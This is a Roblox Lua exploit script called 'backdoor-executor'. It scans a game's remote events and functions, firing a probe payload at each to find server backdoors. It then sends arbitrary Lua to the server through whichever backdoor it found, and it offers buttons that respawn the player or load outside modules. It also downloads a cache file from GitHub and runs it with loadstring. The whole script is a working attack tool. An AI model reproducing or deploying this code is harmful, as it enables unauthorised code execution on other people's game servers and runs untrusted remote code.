-- // SERVICES
local HTTPService = game:GetService("HttpService")
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TextService = game:GetService("TextService")
local TweenService = game:GetService("TweenService")
local UIS = game:GetService("UserInputService")
-- // OBJECTS
local Player = Players.LocalPlayer
local GUI = game:GetObjects("rbxassetid://7134913833")[1]
local MainUI = GUI.MainUI
local Topbar = MainUI.Topbar
local AttachedText = Topbar.AttachedText
local ExecutorUI = MainUI.ExecutorUI
local TextIDE = ExecutorUI.TextIDE
local SF_Textbox = TextIDE.Textbox
local SF_TextLines = TextIDE.TextLines
local Textbox = SF_Textbox.Textbox
local TextLines = SF_TextLines.TextLines
local ExecBtn = ExecutorUI.ExecuteBtn
local ClearBtn = ExecutorUI.ClearBtn
local R6Btn = ExecutorUI.R6Btn
local RespawnBtn = ExecutorUI.RespawnBtn
local AttachBtn = ExecutorUI.AttachBtn
-- // VARIABLES
local testSource = [[local daValue = Instance.new("StringValue") daValue.Name, daValue.Parent, daValue.Value = game.PlaceId, workspace, "%s"]]
local ScannedNameEvents = table.create(0)
local EventInfo = {
	["EventInstance"] = nil,
	["EventPath"] = "",
	["EventArgs"] = {"source"},
	["EventSourcePlace"] = 1,
	["EventSourceFunc"] = nil,
}
local CachedPlaces = isfile("backdoor-cache.lua") and readfile("backdoor-cache.lua") or game:HttpGet("https://raw.githubusercontent.com/jLn0n/created-scripts-public/main/misc/backdoor-cache.lua", false)
local MSG_TEXT = {
	["AttachedEventPrint"] = "\nATTACHED EVENT: %s\nTYPE: %s",
	["EventPrint"] = "\nEVENT: %s\nTYPE: %s",
	["OutdatedCacheWarn"] = "The cache of [%s] on PlaceId '%s' seems to be outdated."
}
local Debounce1, AttachDeb = true, true
local CreateNotification, CreateTween, Draggify, ExecuteLua, GetAncestors, GetAncestorsName, GetTextSize, GotAttached, FindBackdoors, InitLines, InitTextbox, StringToInstance, SyncTextboxScrolling
-- // MAIN
CreateNotification = function(text)
	return StarterGui:SetCore("SendNotification", {
		Title = "backdoor-executor",
		Text = text,
		Duration = 5
	})
end

CreateTween = function(object, tweenInfo, goal)
	return TweenService:Create(object, tweenInfo, goal)
end

Draggify = function(frame, button)
	local dragToggle = false
	local dragInput
	local dragStart
	local startPos
	local updateInput = function(input)
		local delta = input.Position - dragStart
		local pos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		CreateTween(frame, TweenInfo.new(0), {
			Position = pos
		}):Play()
	end
	button.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	button.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	UIS.InputChanged:Connect(function(input)
		if input == dragInput and dragToggle then
			updateInput(input)
		end
	end)
end

ExecuteLua = function(source)
	if EventInfo.EventInstance then
		EventInfo.EventArgs[EventInfo.EventSourcePlace] = EventInfo.EventSourceFunc and EventInfo.EventSourceFunc(source) or source
		if EventInfo.EventInstance:IsA("RemoteEvent") then
			EventInfo.EventInstance:FireServer(unpack(EventInfo.EventArgs))
		elseif EventInfo.EventInstance:IsA("RemoteFunction") then
			coroutine.wrap(function() EventInfo.EventInstance:InvokeServer(unpack(EventInfo.EventArgs)) end)()
		end
	end
end

FindBackdoors = function()
	for _, Object in ipairs(game:GetDescendants()) do
		if EventInfo.EventInstance then break end
		if Object:IsA("RemoteEvent") or Object:IsA("RemoteFunction") then
			if table.find(GetAncestorsName(Object), "HDAdminClient") or table.find(GetAncestorsName(Object), "Basic Admin Essentials") or Object.Name == "CharacterSoundEvent" or Object.Parent.Name == "MouseInfo" or ScannedNameEvents[Object.Name] then continue end
			print(string.format(MSG_TEXT.EventPrint, Object:GetFullName(), Object.ClassName))
			if Object:IsA("RemoteEvent") then
				Object:FireServer(string.format(testSource, Object:GetFullName()))
			elseif Object:IsA("RemoteFunction") then
				pcall(coroutine.wrap(function() Object:InvokeServer(string.format(testSource, Object:GetFullName())) end))
			end
			ScannedNameEvents[Object.Name] = true
			wait()
		end
	end
	local valueLOL = workspace:FindFirstChild(game.PlaceId)
	if valueLOL and valueLOL.Value ~= "" then
		pcall(function()
			GotAttached(StringToInstance(valueLOL.Value))
		end)
	end
	table.clear(ScannedNameEvents)
end

GetAncestors = function(object)
	local objParent = object.Parent
	local result = table.create(0)
	while (objParent and objParent.Parent) do
		table.insert(result, objParent)
		objParent = objParent.Parent
	end
	return result
end

GetAncestorsName = function(object)
	local result = table.create(0)
	for _, instance in ipairs(GetAncestors(object)) do
		table.insert(result, instance.Name)
	end
	return result
end

GetTextSize = function(object)
	return TextService:GetTextSize(
		object.Text,
		object.TextSize,
		object.Font,
		Vector2.new(object.TextBounds.X, 10e5)
	)
end

GotAttached = function(backdooredEvent)
	EventInfo.EventInstance, EventInfo.EventPath, EventInfo.EventSourcePlace = backdooredEvent, backdooredEvent:GetFullName(), table.find(EventInfo.EventArgs, "source")
	ClearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	ExecBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	RespawnBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	R6Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
	AttachedText.Visible = true
	AttachBtn.TextColor3 = Color3.fromRGB(145, 145, 145)
	print(string.format(MSG_TEXT.AttachedEventPrint, backdooredEvent:GetFullName(), backdooredEvent.ClassName))
	ExecuteLua("game.Workspace:FindFirstChild(game.PlaceId):Destroy()")
end

InitLines = function()
	local line = 1
	TextLines.Text = ""
	string.gsub(Textbox.Text, "\n", function()
		line = line + 1
	end)
	for lines = 1, line do
		TextLines.Text = TextLines.Text .. lines .. "\n"
	end
end

InitTextbox = function()
	InitLines()
	Textbox.Text = string.gsub(Textbox.Text, "\t", " ")
	local TextSize = GetTextSize(Textbox)
	local TextLineSize = GetTextSize(TextLines)
	-- // TextLines
	SF_TextLines.Size = UDim2.new(0, TextLineSize.X + 9, 1, 0)
	SF_TextLines.CanvasSize = UDim2.new(0, 0, 0, TextLineSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
	-- // Textbox
	SF_Textbox.Position = UDim2.new(0, (SF_TextLines.Size.X.Offset + 1), 0, 0)
	SF_Textbox.Size = UDim2.new(1, -(SF_TextLines.Size.X.Offset + 1), 1, 0)
	SF_Textbox.CanvasSize = UDim2.new(0, (TextSize.X > TextIDE.AbsoluteSize.X and TextSize.X + (TextSize.Y > TextIDE.AbsoluteSize.Y and 2 or 1) or 0), 0, TextSize.Y + (TextSize.X > TextIDE.AbsoluteSize.X and 2 or 1))
end

StringToInstance = function(pathString)
	local pathSplit = string.split(pathString, ".")
	local result = game
	for _, path in ipairs(pathSplit) do
		result = result:FindFirstChild(path) and result[path] or nil
	end
	return result
end

SyncTextboxScrolling = function()
	SF_TextLines.CanvasPosition = Vector2.new(0, SF_Textbox.CanvasPosition.Y)
end

AttachBtn.MouseButton1Click:Connect(function()
	if AttachDeb and not EventInfo.EventInstance then
		CreateNotification("Press F9 to see the remotes being scanned.")
		AttachDeb = false
		for cachedPlaceId, cache in pairs(CachedPlaces) do
			if game.PlaceId == cachedPlaceId then
				local succ, res = pcall(StringToInstance, cache.Path)
				if succ then
					EventInfo.EventArgs, EventInfo.EventSourceFunc = cache.Args, cache.SourceFunc or nil
					GotAttached(res)
					break
				else
					warn(string.format(MSG_TEXT.OutdatedCacheWarn, cache.Path, game.PlaceId))
					break
				end
			end
		end
		FindBackdoors()
		if not EventInfo.EventInstance then
			CreateNotification("No backdoor(s) here!")
			print("No backdoor(s) here!")
			wait(.5)
			AttachDeb = true
		end
	end
end)

ClearBtn.MouseButton1Click:Connect(function() Textbox.Text = "" end)
ExecBtn.MouseButton1Click:Connect(function() ExecuteLua(Textbox.Text) end)
RespawnBtn.MouseButton1Click:Connect(function() ExecuteLua(string.format([[game.Players.%s:LoadCharacter()]], Player.Name)) end)
R6Btn.MouseButton1Click:Connect(function() ExecuteLua(string.format([[require(4912728750):r6("%s")]], Player.Name)) end)
Textbox:GetPropertyChangedSignal("Text"):Connect(InitTextbox)
SF_Textbox:GetPropertyChangedSignal("CanvasPosition"):Connect(SyncTextboxScrolling)

UIS.InputBegan:Connect(function(input)
	local Tween, Connection
	local tweenInfo = TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	if input.KeyCode == Enum.KeyCode.Equals and UIS:GetFocusedTextBox() == nil then
		if Debounce1 then
			Debounce1 = false
			if not MainUI.Visible then
				MainUI.Visible = true
				Tween = CreateTween(MainUI, tweenInfo, {
					Size = UDim2.new(0, 500, 0, 300)
				})
				Tween:Play()
				Connection = Tween.Completed:Connect(function()
					Topbar.Visible = true
					ExecutorUI.Visible = true
					Debounce1 = false
				end)
			elseif MainUI.Visible then
				Tween = CreateTween(MainUI, tweenInfo, {
					Size = UDim2.new(0, 0, 0, 0)
				})
				MainUI.Position = UDim2.new(.5, 0, .5, 0)
				Topbar.Visible = false
				ExecutorUI.Visible = false
				wait()
				Tween:Play()
				Connection = Tween.Completed:Connect(function()
					MainUI.Visible = false
					Debounce1 = false
				end)
			end
			wait(.75)
			Debounce1 = true
			Connection:Disconnect()
			Tween:Destroy()
		end
	end
end)

do -- INITIALIZER
	local Tween, Connection
	local gethui = gethui or gethiddenui or get_hidden_gui or nil
	GUI.Name, GUI.Parent = "backdoor-executor", gethui and gethui() or game:GetService("CoreGui")
	MainUI.Visible = true
	Tween = CreateTween(MainUI, TweenInfo.new(.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		Size = UDim2.new(0, 500, 0, 300)
	})
	Connection = Tween.Completed:Connect(function()
		Topbar.Visible = true
		ExecutorUI.Visible = true
		Connection:Disconnect()
		Tween:Destroy()
	end)
	Draggify(MainUI, Topbar);InitTextbox()
	Tween:Play()
	if not isfile("backdoor-cache.lua") then writefile("backdoor-cache.lua", CachedPlaces) end
	CachedPlaces = loadstring(readfile("backdoor-cache.lua"))()
end
